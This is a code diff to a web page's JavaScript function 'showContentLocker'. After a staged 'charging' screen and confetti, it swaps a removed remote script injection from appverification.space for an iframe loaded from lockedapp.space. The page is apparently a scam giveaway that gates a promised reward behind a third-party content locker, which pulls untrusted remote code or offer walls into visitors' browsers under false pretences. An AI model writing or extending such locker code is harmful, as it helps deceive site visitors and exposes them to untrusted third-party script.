@@ -1374,27 +1374,23 @@
         function showContentLocker() {
             createConfetti();
 
-            // Close the charging popup
-            popupOverlay.classList.remove('active');
-            document.body.style.overflow = '';
+            // Hide the charging stage
+            stageCharging.classList.add('hidden');
+            stageLocker.classList.remove('hidden');
 
-            // Remove any previous content locker script
-            const oldScript = document.getElementById('ogjs');
-            if (oldScript) oldScript.remove();
+            const container = document.getElementById('contentLockerContainer');
+            container.innerHTML = '';
 
-            // Inject content locker into the page body (opens as its own popup)
-            const noscriptTag = document.createElement('noscript');
-            const metaTag = document.createElement('meta');
-            metaTag.httpEquiv = 'refresh';
-            metaTag.content = '0;url=https://appverification.space/noscript';
-            noscriptTag.appendChild(metaTag);
-            document.body.appendChild(noscriptTag);
+            // Create iframe for the content locker
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://lockedapp.space/cl/i/exxjpm';
+            iframe.style.width = '100%';
+            iframe.style.height = '100%';
+            iframe.style.minHeight = '400px';
+            iframe.style.border = 'none';
+            iframe.style.borderRadius = '12px';
 
-            const script = document.createElement('script');
-            script.type = 'text/javascript';
-            script.id = 'ogjs';
-            script.src = 'https://appverification.space/cl/js/exxjpm';
-            document.body.appendChild(script);
+            container.appendChild(iframe);
         }
 
         function createConfetti() {
